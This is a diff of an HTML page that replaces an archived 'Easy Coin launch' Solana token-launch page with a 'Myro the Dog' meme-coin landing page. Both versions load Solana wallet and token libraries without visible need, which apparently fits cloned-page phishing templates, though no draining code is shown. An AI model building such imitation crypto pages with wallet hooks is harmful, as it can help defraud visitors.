@@ -1,490 +1,81 @@
 <!DOCTYPE html>
-<html lang="en" data-scrapbook-source="https://easycoinlaunch.com/" data-scrapbook-create="20250319170746500" data-scrapbook-title="Easy Coin launch">
-    <div id="in-page-channel-node-id" data-channel-name="in_page_channel_i_-xHZ"></div>
+<html lang="en">
     <head>
-        <style>
-            body {
-                transition: opacity ease-in 0.2s;
-            }
-
-            body[unresolved] {
-                opacity: 0;
-                display: block;
-                overflow: hidden;
-                position: relative;
-            }
-        </style>
-        <meta charset="UTF-8">
-        <link rel="shortcut icon" href="logo.png" type="image/x-icon">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Easy Coin launch</title>
-        <link rel="stylesheet" href="style/index-DMvDlGC1.css">
-        <script data-scrapbook-elem="custom-elements-loader">
-            (function(names) {
-                if (!customElements) {
-                    return;
-                }
-                for (const name of names) {
-                    customElements.define(name, class CustomElement extends HTMLElement {
-                    }
-                    );
-                }
-            }
-            )(["veepn-lock-screen", "veepn-guard-alert"])
-        </script>
+        <meta charset="UTF-8"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+        <link rel="icon" type="image/x-icon" href="/assets/img/favicon.ico"/>
+        <title>Myro the Dog</title>
+        <link rel="stylesheet" href="/assets/css/style.min.css"/>
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
         <script src="https://unpkg.com/@solana/web3.js@1.91.1/lib/index.iife.min.js"></script>
         <script src="https://unpkg.com/@solana/spl-token@0.1.6/lib/index.iife.js"></script>
     </head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src="./b90a6ff7843b2345929b6eac653fa71bee4178c6c7089161028b8e6c25601047.js"></script>
-    <body cz-shortcut-listen="true" style="overflow: visible;">
-        <div id="root">
-            <div class="">
-                <header class="fixed top-5 w-full z-20 lg:block hidden">
-                    <nav class="mx-auto bg_glass flex justify-between items-center p-1 rounded-full w-[80%] bg-[#041114] transition-all duration-300 ease-in-out">
-                        <a aria-current="page" class="active" href="" data-discover="true">
-                            <img src="logo.png" alt="Logo" class="w-16">
-                        </a>
-                        <ul class="flex space-x-4 justify-center flex-1">
-                            <li class="relative ">
-                                <a aria-current="page" class="text-gradient " href="" data-discover="true">Home</a>
-                            </li>
-                            <li class="relative ">
-                                <a class="text-white" data-discover="true">Create Token</a>
-                            </li>
-                            <li class="relative ">
-                                <a class="text-white " data-discover="true">Liquidity Pool</a>
-                            </li>
-                            <li class="relative ">
-                                <a class="text-white " data-discover="true">Manage Liquidity</a>
-                            </li>
-                            <li class="relative ">
-                                <a class="text-white" data-discover="true">Help</a>
-                            </li>
-                        </ul>
-                        <div class="wallet-adapter-dropdown">
-                            <button ID = "status" class="connect-button" tabindex="0" type="button" style="pointer-events: auto;">
-                                <i class="wallet-adapter-button-start-icon">
-                                    <img src="078a264cd05cec66acb42574be3caa03bcba5441.svg" alt="Phantom icon">
-                                </i>
-                                Connected
-                            </button>
-                            <ul aria-label="dropdown-list" class="wallet-adapter-dropdown-list false" role="menu">
-                                <li class="wallet-adapter-dropdown-list-item" role="menuitem">Copy address</li>
-                                <li class="wallet-adapter-dropdown-list-item" role="menuitem">Change wallet</li>
-                                <li class="wallet-adapter-dropdown-list-item" role="menuitem">Disconnect</li>
-                            </ul>
-                        </div>
-                    </nav>
-                </header>
-                <header class="flex lg:hidden p-4 relative items-center justify-between lg:hidden">
-                    <div class="absolute top-0 left-0 filter_blur bg-[#76d9f0] h-[15vh] w-full lg:w-[40%] z-[-10]"></div>
-                    <a aria-current="page" class="active" href="" data-discover="true">
-                        <img src="logo.png" alt="Logo" class="w-16">
-                    </a>
-                    <button class="flex-1 flex justify-end">
-                        <img src="menu.png" alt="Menu Icon" class="w-8">
-                    </button>
-                </header>
-                <div>
-                    <section class="min-h-screen relative flex items-center justify-center">
-                        <div class="absolute top-0 left-0 filter_blur bg-[#76d9f0] h-[15vh] lg:w-[40%] z-[-10]"></div>
-                        <div class="absolute top-[40%] right-0 filter_blur rounded-full bg-[#17a1af] h-[50vh] w-[40vw] mx-auto z-[-10]"></div>
-                        <div class="flex flex-col gap-y-6 md:flex-row items-center lg:mt-20 justify-between w-full lg:w-[80%] mx-auto px-4">
-                            <div class="space-y-5 w-full lg:w-[50%]">
-                                <h1 class="text-gradient text-center lg:text-start text-5xl lg:text-6xl" style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px); opacity: 1;">Tokens &amp;Liquidity</h1>
-                                <p class="text-base lg:text-xl text-center lg:text-start" style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px); opacity: 1;">Launch Tokens, and Create Liquidity Pool. Effortless and no coding required!</p>
-                                <div class="flex md:flex-row flex-col items-center justify-start gap-4 " style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px); opacity: 1;">
-                                    <a class=" w-[90%] lg:w-[45%] " data-discover="true">
-                                        <button class="inline-flex items-center justify-center gap-2 whitespace-nowrap text-sm font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 bg-primary text-primary-foreground shadow hover:bg-primary/70 rounded-full h-10 px-4 py-3 w-full">Create Token</button>
-                                    </a>
-                                    <a class=" w-[90%] lg:w-[45%] " data-discover="true">
-                                        <button class="inline-flex items-center justify-center gap-2 whitespace-nowrap text-sm font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 bg_glass text-primary rounded-full shadow-sm hover:bg-destructive/70 border border-primary hover:transition-all duration-300 h-10 px-4 py-3 w-full">Create Liquidity</button>
-                                    </a>
-                                </div>
-                            </div>
-                            <div class="mx-auto lg:m w-full lg:w-[50%] flex justify-end">
-                                <img src="solana2.png" alt="" class="w-full lg:w-[70%]">
-                            </div>
-                        </div>
-                    </section>
-                    <section class="relative py-10 w-[80%] mx-auto">
-                        <div class="absolute top-[40%] right-[28%] filter_blur rounded-full bg-[#17a1af]/60 h-[40vh] w-[40vw] mx-auto z-[-10]"></div>
-                        <h1 class="text-gradient text-center text-5xl lg:text-6xl">Our Numbers</h1>
-                        <div class="w-full md:w-[70%] mx-auto flex gap-x-4 gap-y-16 flex-wrap justify-between md:flex-row flex-col mt-20">
-                            <div class="w-full md:w-[45%] bg_dark border border-gray-700 p-5 rounded-xl relative" style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px); opacity: 1;">
-                                <div class="absolute top-[-20%] md:top-[-29%] h-[50px] w-[50px] md:h-[70px] md:w-[70px] bg_dark2 right-0 p-3 md:p-4 rounded-full flex items-center justify-center">
-                                    <img src="users.png" class="w-20 opacity-60" alt="">
-                                </div>
-                                <div>
-                                    <h2 class="text-xl md:text-3xl text-white">Total Users</h2>
-                                    <p class="text-gradient text-3xl md:text-4xl mt-6">
-                                        <span>+7,000</span>
-                                    </p>
-                                </div>
-                            </div>
-                            <div class="w-full md:w-[45%] bg_dark border border-gray-700 p-5 rounded-xl relative" style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px); opacity: 1;">
-                                <div class="absolute top-[-20%] md:top-[-29%] h-[50px] w-[50px] md:h-[70px] md:w-[70px]  border border-gray-700 bg_dark2 right-0 p-3 md:p-4 rounded-full flex items-center justify-center">
-                                    <img src="projects.png" class="w-20 opacity-60" alt="">
-                                </div>
-                                <div>
-                                    <h2 class="text-xl md:text-3xl text-white">Total Projects</h2>
-                                    <p class="text-gradient text-3xl md:text-4xl mt-6">
-                                        <span>+2,500</span>
-                                    </p>
-                                </div>
-                            </div>
-                            <div class="w-full md:w-[45%] bg_dark border border-gray-700 p-5 rounded-xl relative" style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px); opacity: 1;">
-                                <div class="absolute top-[-20%] bg_dark2 md:top-[-29%] h-[50px] w-[50px] md:h-[70px] md:w-[70px] bg_dark right-0 p-3 md:p-4 rounded-full flex items-center justify-center">
-                                    <img src="volume.png" class="w-20 opacity-60" alt="">
-                                </div>
-                                <div>
-                                    <h2 class="text-xl md:text-3xl text-white">Volume</h2>
-                                    <p class="text-gradient text-3xl md:text-4xl mt-6">
-                                        <span>+65M</span>
-                                    </p>
-                                </div>
-                            </div>
-                            <div class="w-full md:w-[45%] bg_dark border border-gray-700 p-5 rounded-xl relative" style="translate: none; rotate: none; scale: none; transform: translate(0px, 0px); opacity: 1;">
-                                <div class="absolute top-[-20%] bg_dark2 md:top-[-29%] h-[50px] w-[50px] md:h-[70px] md:w-[70px] bg_dark right-0 p-3 md:p-4 rounded-full flex items-center justify-center">
-                                    <img src="transactions.png" class="w-8 opacity-60" alt="">
-                                </div>
-                                <div>
-                                    <h2 class="text-xl md:text-3xl text-white">Transactions</h2>
-                                    <p class="text-gradient text-3xl md:text-4xl mt-6">
-                                        <span>+120k</span>
-                                    </p>
-                                </div>
-                            </div>
-                        </div>
-                    </section>
-                    <section class="w-full my-20 relative">
-                        <div class="absolute top-[40%] left-[0%] filter_blur rounded-full bg-[#17a1af]/60 h-[40vh] w-[40vw] mx-auto z-[-10]"></div>
-                        <h1 class="text-gradient text-center text-5xl lg:text-6xl">Frequently Asked Questions</h1>
-                        <div class="w-full lg:w-[80%] mx-auto text-white p-2 my-14 flex flex-col gap-6" data-orientation="vertical">
-                            <div data-state="closed" data-orientation="vertical" class="bg_glass py-3 lg:px-4 rounded-[10px]" style="translate: none; rotate: none; scale: none; transform: translate(0px, 0%); opacity: 1;">
-                                <h3 data-orientation="vertical" data-state="closed" class="flex">
-                                    <button type="button" aria-controls="radix-:r1:" aria-expanded="false" data-state="closed" data-orientation="vertical" id="radix-:r0:" class="flex flex-1 items-center justify-between gap-x-3 px-4 text-sm lg:text-lg py-4 font-medium" data-radix-collection-item="">
-                                        What is Solana, and why should I launch my token on it?
-                                        <div class="bg_dark h-[10px] w-[10px] flex justify-center items-center p-5 transition-transform duration-200 rounded-full">
-                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-plus shrink-0 w-6 h-6">
-                                                <path d="M5 12h14"></path>
-                                                <path d="M12 5v14"></path>
-                                            </svg>
-                                        </div>
-                                    </button>
-                                </h3>
-                                <div data-state="closed" id="radix-:r1:" hidden="" role="region" aria-labelledby="radix-:r0:" data-orientation="vertical" class="overflow-hidden px-4 border-t border-gray-500 text-sm transition-all data-[state=closed]:animate-accordion-up data-[state=open]:animate-accordion-down" style="--radix-accordion-content-height: var(--radix-collapsible-content-height); --radix-accordion-content-width: var(--radix-collapsible-content-width);"></div>
-                            </div>
-                            <div data-state="closed" data-orientation="vertical" class="bg_glass py-3 lg:px-4 rounded-[10px]" style="translate: none; rotate: none; scale: none; transform: translate(0px, 0%); opacity: 1;">
-                                <h3 data-orientation="vertical" data-state="closed" class="flex">
-                                    <button type="button" aria-controls="radix-:r3:" aria-expanded="false" data-state="closed" data-orientation="vertical" id="radix-:r2:" class="flex flex-1 items-center justify-between gap-x-3 px-4 text-sm lg:text-lg py-4 font-medium" data-radix-collection-item="">
-                                        How can I create a token on the Solana blockchain?
-                                        <div class="bg_dark h-[10px] w-[10px] flex justify-center items-center p-5 transition-transform duration-200 rounded-full">
-                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-plus shrink-0 w-6 h-6">
-                                                <path d="M5 12h14"></path>
-                                                <path d="M12 5v14"></path>
-                                            </svg>
-                                        </div>
-                                    </button>
-                                </h3>
-                                <div data-state="closed" id="radix-:r3:" hidden="" role="region" aria-labelledby="radix-:r2:" data-orientation="vertical" class="overflow-hidden px-4 border-t border-gray-500 text-sm transition-all data-[state=closed]:animate-accordion-up data-[state=open]:animate-accordion-down" style="--radix-accordion-content-height: var(--radix-collapsible-content-height); --radix-accordion-content-width: var(--radix-collapsible-content-width);"></div>
-                            </div>
-                            <div data-state="closed" data-orientation="vertical" class="bg_glass py-3 lg:px-4 rounded-[10px]" style="translate: none; rotate: none; scale: none; transform: translate(0px, 0%); opacity: 1;">
-                                <h3 data-orientation="vertical" data-state="closed" class="flex">
-                                    <button type="button" aria-controls="radix-:r5:" aria-expanded="false" data-state="closed" data-orientation="vertical" id="radix-:r4:" class="flex flex-1 items-center justify-between gap-x-3 px-4 text-sm lg:text-lg py-4 font-medium" data-radix-collection-item="">
-                                        What are the steps to deploy my own token on Solana?
-                                        <div class="bg_dark h-[10px] w-[10px] flex justify-center items-center p-5 transition-transform duration-200 rounded-full">
-                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-plus shrink-0 w-6 h-6">
-                                                <path d="M5 12h14"></path>
-                                                <path d="M12 5v14"></path>
-                                            </svg>
-                                        </div>
-                                    </button>
-                                </h3>
-                                <div data-state="closed" id="radix-:r5:" hidden="" role="region" aria-labelledby="radix-:r4:" data-orientation="vertical" class="overflow-hidden px-4 border-t border-gray-500 text-sm transition-all data-[state=closed]:animate-accordion-up data-[state=open]:animate-accordion-down" style="--radix-accordion-content-height: var(--radix-collapsible-content-height); --radix-accordion-content-width: var(--radix-collapsible-content-width);"></div>
-                            </div>
-                            <div data-state="closed" data-orientation="vertical" class="bg_glass py-3 lg:px-4 rounded-[10px]" style="translate: none; rotate: none; scale: none; transform: translate(0px, 0%); opacity: 1;">
-                                <h3 data-orientation="vertical" data-state="closed" class="flex">
-                                    <button type="button" aria-controls="radix-:r7:" aria-expanded="false" data-state="closed" data-orientation="vertical" id="radix-:r6:" class="flex flex-1 items-center justify-between gap-x-3 px-4 text-sm lg:text-lg py-4 font-medium" data-radix-collection-item="">
-                                        How can I manage token authorities on Solana?
-                                        <div class="bg_dark h-[10px] w-[10px] flex justify-center items-center p-5 transition-transform duration-200 rounded-full">
-                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-plus shrink-0 w-6 h-6">
-                                                <path d="M5 12h14"></path>
-                                                <path d="M12 5v14"></path>
-                                            </svg>
-                                        </div>
-                                    </button>
-                                </h3>
-                                <div data-state="closed" id="radix-:r7:" role="region" aria-labelledby="radix-:r6:" data-orientation="vertical" class="overflow-hidden px-4 border-t border-gray-500 text-sm transition-all data-[state=closed]:animate-accordion-up data-[state=open]:animate-accordion-down" style="--radix-accordion-content-height: var(--radix-collapsible-content-height); --radix-accordion-content-width: var(--radix-collapsible-content-width); --radix-collapsible-content-height: 76.80000305175781px; --radix-collapsible-content-width: 1178.875px;" hidden=""></div>
-                            </div>
-                            <div data-state="closed" data-orientation="vertical" class="bg_glass py-3 lg:px-4 rounded-[10px]" style="translate: none; rotate: none; scale: none; transform: translate(0px, 0%); opacity: 1;">
-                                <h3 data-orientation="vertical" data-state="closed" class="flex">
-                                    <button type="button" aria-controls="radix-:r9:" aria-expanded="false" data-state="closed" data-orientation="vertical" id="radix-:r8:" class="flex flex-1 items-center justify-between gap-x-3 px-4 text-sm lg:text-lg py-4 font-medium" data-radix-collection-item="">
-                                        What platforms can assist with launching a token on Solana?
-                                        <div class="bg_dark h-[10px] w-[10px] flex justify-center items-center p-5 transition-transform duration-200 rounded-full">
-                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-plus shrink-0 w-6 h-6">
-                                                <path d="M5 12h14"></path>
-                                                <path d="M12 5v14"></path>
-                                            </svg>
-                                        </div>
-                                    </button>
-                                </h3>
-                                <div data-state="closed" id="radix-:r9:" role="region" aria-labelledby="radix-:r8:" data-orientation="vertical" class="overflow-hidden px-4 border-t border-gray-500 text-sm transition-all data-[state=closed]:animate-accordion-up data-[state=open]:animate-accordion-down" style="--radix-accordion-content-height: var(--radix-collapsible-content-height); --radix-accordion-content-width: var(--radix-collapsible-content-width); --radix-collapsible-content-height: 76.80000305175781px; --radix-collapsible-content-width: 1178.875px;" hidden=""></div>
-                            </div>
-                        </div>
-                    </section>
+    <body>
+        <header>
+            <div class="container">
+                <a href="/" class="header__logo">
+                    <img src="/assets/img/logo.svg" alt=""/>
+                </a>
+                <div class="mobile-btn">
+                    <svg class="default" xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 40 40" fill="none">
+                        <path d="M8.3335 8.33333H20.0002H31.6668" stroke="#F8F7FF" stroke-width="4" stroke-linecap="round"/>
+                        <path d="M8.3335 20H31.6668" stroke="#F8F7FF" stroke-width="4" stroke-linecap="round"/>
+                        <path d="M8.3335 31.6667H20.0002H31.6668" stroke="#F8F7FF" stroke-width="4" stroke-linecap="round"/>
+                    </svg>
+                    <svg class="close" xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 40 40" fill="none">
+                        <path d="M8.3335 8.33333L20.0002 20L31.6668 8.33333" stroke="#F8F7FF" stroke-width="4" stroke-linecap="round"/>
+                        <path d="M8.3335 31.6667L20.0002 20L31.6668 31.6667" stroke="#F8F7FF" stroke-width="4" stroke-linecap="round"/>
+                    </svg>
                 </div>
-                <footer class="bg-[#041114] px-5 py-10">
-                    <div class="flex flex-col gap-y-8 md:gap-10 lg:gap-x-3 xl:gap-0 md:flex-row flex-wrap justify-between w-full lg:w-[80%] mx-auto">
-                        <div class="flex flex-col gap-2 w-full md:w-[50%] lg:w-[20%] xl:w-[20%]">
-                            <img src="logo.png" alt="" class="w-20">
-                            <p class="text-gray-400 mt-5">Launch Tokens, and create Presales. Effortless and no coding required.</p>
-                            <a href="https://easycoinlaunch.com/affiliate" data-discover="true">
-                                <button class="inline-flex items-center justify-center gap-2 whitespace-nowrap text-sm font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 bg_glass text-primary rounded-full shadow-sm hover:bg-destructive/70 border border-primary hover:transition-all duration-300 h-10 px-4 py-3 w-full mt-5">Become an Affiliate</button>
-                            </a>
-                        </div>
-                        <div class="flex flex-col gap-2 w-full md:w-[50%] lg:w-[25%] xl:w-[20%]">
-                            <h3 class="text-gradient text-2xl">Quick Links</h3>
-                            <div class="mt-2 space-y-4 flex flex-col">
-                                <div class="relative">
-                                    <a class="text-gray-400 " href="" data-discover="true">Home</a>
-                                </div>
-                                <div class="relative">
-                                    <a class="text-gray-400 " href="https://easycoinlaunch.com/createToken" data-discover="true">Create Token</a>
-                                </div>
-                                <div class="relative">
-                                    <a class="text-gray-400 " href="https://easycoinlaunch.com/createLiquidityPool" data-discover="true">Liquidity Pool</a>
-                                </div>
-                                <div class="relative">
-                                    <a class="text-gray-400 " href="https://easycoinlaunch.com/manageLiquidity" data-discover="true">Manage Liquidity</a>
-                                </div>
-                                <div class="relative">
-                                    <a class="text-gray-400 " href="https://easycoinlaunch.com/help" data-discover="true">Help</a>
-                                </div>
-                            </div>
-                        </div>
+                <div class="header__links">
+                    <a href="/" class="links__link">Home</a>
+                    <a href="#about" class="links__link">About</a>
+                    <a href="#tokenomics" class="links__link">Tokenomics</a>
+                    <a href="https://myrothedog.com/MyroWP.pdf" class="links__link">Whitepaper</a>
+                    <a href="#social" class="links__link">Socials</a>
+                    <a target="_blank" class="links__btn">Telegram</a>
+                    <div class="social__links">
+                        <a href="https://twitter.com/MyroSOL" target="_blank">
+                            <img src="/assets/img/social_x.png" alt=""/>
+                        </a>
+                        <a href="https://t.me/myroSOL" target="_blank">
+                            <img src="/assets/img/social_tg.png" alt=""/>
+                        </a>
                     </div>
-                    <div class="pt-5 mt-10 border-t border-gray-800 w-full">
-                        <p class="text-center text-gray-400 text-sm">©2024 Easy Coin Launch. All Rights Reserved.</p>
-                    </div>
-                </footer>
+                </div>
             </div>
-        </div>
-        <veepn-lock-screen data-scrapbook-shadowdom="<style>html{box-sizing:border-box;text-size-adjust:100%;word-break:normal;-moz-tab-size:4;tab-size:4}*,:before,:after{background-repeat:no-repeat;box-sizing:border-box}:before,:after{text-decoration:inherit;vertical-align:inherit}*{padding:0;margin:0}hr{overflow:visible;height:0;color:inherit;border:0;border-top:1px solid}details,main{display:block}summary{display:list-item}small{font-size:80%}[hidden]{display:none!important}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}a{background-color:transparent}a:active,a:hover{outline-width:0}code,kbd,pre,samp{font-family:monospace}pre{font-size:1em}b,strong{font-weight:bolder}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{border-color:inherit;text-indent:0}iframe{border-style:none}input{border-radius:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;-moz-appearance:textfield;appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-decoration{-webkit-appearance:none;-moz-appearance:none;appearance:none}textarea{overflow:auto;resize:vertical}button,input,optgroup,select,textarea{font:inherit;color:inherit}optgroup{font-weight:700}button{overflow:visible}button,select{text-transform:none}button,[type=button],[type=reset],[type=submit],[role=button]{cursor:pointer}button::-moz-focus-inner,[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner{border-style:none;padding:0}button,html [type=button],[type=reset],[type=submit]{-webkit-appearance:button;-moz-appearance:button;appearance:button}button,input,select,textarea{background-color:transparent;border-style:none}button:-moz-focusring,[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner{outline:1px dotted ButtonText}select{-webkit-appearance:none;-moz-appearance:none;appearance:none}a:focus,button:focus,input:focus,select:focus,textarea:focus{outline-width:0}select::-ms-expand{display:none}select::-ms-value{color:currentcolor}legend{border:0;color:inherit;display:table;white-space:normal;max-width:100%}::-webkit-file-upload-button{-webkit-appearance:button;-moz-appearance:button;appearance:button;color:inherit;font:inherit}[disabled]{cursor:default}img{border-style:none}progress{vertical-align:baseline}[aria-busy=true]{cursor:progress}[aria-controls]{cursor:pointer}[aria-disabled=true]{cursor:default}ul,ol{list-style-type:none}figure{margin:0}.lock-screen{font-family:FigtreeVF,sans-serif;letter-spacing:normal;position:fixed;z-index:2147483638;top:0;right:0;bottom:0;left:0;padding:32px 40px;color:#222e3a;background-color:#fdfdfd;display:flex;flex-direction:column;row-gap:12px;overflow:auto;background-image:radial-gradient(circle at 0% 0%,#e6fffdcc,#e6fffd00 50%),radial-gradient(circle at 100% 0%,#ebfffecc,#ebfffe00 50%),radial-gradient(circle at 100% 100%,#f0f5ffcc,#f0f5ff00 50%),radial-gradient(circle at 0% 100%,#f2f2ffcc,#f2f2ff00 50%),radial-gradient(circle at 50% 50%,#fff,#fffc,#f5f5ff66,#f0f0ff33,#f0f0ff00),linear-gradient(to bottom right,#e6fffd,#f2f2ff);background-size:100% 100%;background-repeat:no-repeat}.lock-screen__header{display:flex;align-items:center;justify-content:space-between}.lock-screen__logo{display:inline-flex;align-items:center;column-gap:12px;font-size:18px;font-weight:600}.lock-screen__close{display:flex;align-items:center;justify-content:center;width:40px;height:40px;border-radius:50%;background-color:#222e3a1a}.lock-screen__main{flex-grow:1;align-content:center}.lock-screen__container{max-width:1120px;margin-inline:auto;display:flex;align-items:center;gap:24px}@media (width < 972px){.lock-screen__container{flex-direction:column}}.lock-screen__timer{display:flex;align-items:center;justify-content:center;width:100%}.lock-screen__content{width:100%}.lock-screen__title{font-size:48px;font-weight:700;line-height:56px;margin-bottom:16px}.lock-screen__description{font-size:18px;line-height:32px;margin-bottom:24px}.lock-screen__actions{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}.lock-screen__action{height:48px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:700;text-align:center;padding:8px 24px}.upgrade-btn{color:#fff;background:linear-gradient(180deg,#20df9e,#13cf8f)}.skip-btn{color:#3066ff;border-width:1px;border-style:solid;border-color:#3066ff;position:relative}.skip-btn__tooltip{font-size:14px;line-height:24px;font-weight:400;position:absolute;z-index:1;left:50%;top:calc(100% + 18px);padding:8px 12px;color:#fff;border:1px solid #4a5764;background-color:#222e3a;border-radius:8px;width:max-content;pointer-events:none;animation:slide-in .6s ease-in-out forwards}@keyframes slide-in{0%{opacity:0;transform:translate(-50%,-100%)}to{opacity:1;transform:translate(-50%)}}.skip-btn__tooltip:after{content:&quot;&quot;;display:block;position:absolute;z-index:1;top:-8px;left:50%;width:0;height:0;border-style:solid;border-width:0 8px 8px;border-color:transparent transparent #222e3a;transform:translate(-6px)}.skip-btn__icon{display:none}.skip-btn:disabled{cursor:not-allowed}.skip-btn:disabled .skip-btn__tooltip,.skip-btn:disabled .skip-btn__text{display:none}.skip-btn:disabled .skip-btn__icon{display:initial;animation:tick-tock .8s steps(8,end) infinite}@keyframes tick-tock{to{transform:rotate(360deg)}}.timer{position:relative;max-width:422px;width:100%;aspect-ratio:1/1;border-radius:50%;background-color:#fff;box-shadow:0 0 40px #2b374114;display:flex;align-items:center;justify-content:center;pointer-events:none;-webkit-user-select:none;user-select:none}.timer__circle-backward{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);z-index:0;max-width:100%;height:auto;opacity:.4}.timer__circle-forward{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%) rotate(45deg);z-index:1;max-width:100%;height:auto;animation:sector 5s linear forwards}.timer__fire-icon{position:absolute;top:22%;left:50%;transform:translate(-50%);z-index:2}.timer__text{font-size:clamp(18px,10vw,88px);letter-spacing:-1px;text-align:center;font-variant-numeric:tabular-nums;position:relative;z-index:3}.timer--finished .timer__text{color:#98a0a9}.timer--finished .timer__circle-forward{display:none}@keyframes sector{0%{clip-path:polygon(50% 50%,0% 2%,100% 0%,100% 100%,0% 100%,0% 2%)}25%{clip-path:polygon(50% 50%,0% 2%,100% 0%,100% 100%,0% 100%,0% 100%)}25.000001%{clip-path:polygon(50% 50%,0% 2%,100% 0%,100% 100%,0% 100%)}50%{clip-path:polygon(50% 50%,0% 2%,100% 0%,100% 100%,100% 100%)}50.000001%{clip-path:polygon(50% 50%,0% 2%,100% 0%,100% 100%)}75%{clip-path:polygon(50% 50%,0% 2%,100% 0%,100% 0%)}75.000001%{clip-path:polygon(50% 50%,0% 2%,100% 0%)}to{clip-path:polygon(50% 50%,0% 2%,0% 0%)}}@media (prefers-color-scheme: dark){.lock-screen{color:#fff;background-image:radial-gradient(circle at 0% 0%,#2f4f4fcc,#2f4f4f00 50%),radial-gradient(circle at 100% 0%,#193042cc,#19304200 50%),radial-gradient(circle at 100% 100%,#1c3041cc,#1c304100 50%),radial-gradient(circle at 0% 100%,#1b263bcc,#1b263b00 50%),radial-gradient(circle at 50% 50%,#141e28,#141e28cc,#1b263b66,#1c304133,#1c304100),linear-gradient(to bottom right,#2f4f4f,#1b263b)}.lock-screen__close{background-color:#ffffff1a}.skip-btn{color:#fff;border-color:#fff}.skip-btn__tooltip{color:#222e3a;border:1px solid #f5f6f7;background-color:#fff}.skip-btn__tooltip:after{border-color:transparent transparent #fff}.timer{background-color:#191b25}.timer__circle-backward{opacity:1}.timer--finished .timer__text{color:#5c6977}}</style>">
-            <style>
-                @font-face {
-                    font-family: FigtreeVF;
-                    src: url("chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2") format("woff2 supports variations"),url("chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2") format("woff2-variations");
-                    font-weight: 100 1000;
-                    font-display: swap
-                }
-            </style>
-        </veepn-lock-screen>
-        <veepn-guard-alert data-scrapbook-shadowdom="<style>html{box-sizing:border-box;text-size-adjust:100%;word-break:normal;-moz-tab-size:4;tab-size:4}*,:before,:after{background-repeat:no-repeat;box-sizing:border-box}:before,:after{text-decoration:inherit;vertical-align:inherit}*{padding:0;margin:0}hr{overflow:visible;height:0;color:inherit;border:0;border-top:1px solid}details,main{display:block}summary{display:list-item}small{font-size:80%}[hidden]{display:none}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}a{background-color:transparent}a:active,a:hover{outline-width:0}code,kbd,pre,samp{font-family:monospace}pre{font-size:1em}b,strong{font-weight:bolder}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{border-color:inherit;text-indent:0}iframe{border-style:none}input{border-radius:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;-moz-appearance:textfield;appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-decoration{-webkit-appearance:none;-moz-appearance:none;appearance:none}textarea{overflow:auto;resize:vertical}button,input,optgroup,select,textarea{font:inherit;color:inherit}optgroup{font-weight:700}button{overflow:visible}button,select{text-transform:none}button,[type=button],[type=reset],[type=submit],[role=button]{cursor:pointer}button::-moz-focus-inner,[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner{border-style:none;padding:0}button,html 